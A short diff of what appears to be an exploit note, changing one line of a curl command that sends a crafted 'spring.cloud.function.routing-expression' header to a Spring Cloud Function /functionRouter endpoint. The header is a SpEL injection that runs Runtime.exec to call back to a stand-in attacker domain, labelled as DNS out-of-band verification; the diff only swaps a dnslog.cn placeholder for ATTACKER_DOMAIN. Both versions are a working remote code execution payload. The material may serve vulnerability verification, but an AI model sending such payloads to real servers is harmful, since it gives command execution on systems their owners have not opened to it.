@@ -61,7 +61,7 @@ curl -X POST "http://target:8080/functionRouter" \
 
 # DNS 外带验证
 curl -X POST "http://target:8080/functionRouter" \
-  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER.dnslog.cn')" \
+  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER_DOMAIN')" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "test"
 ```
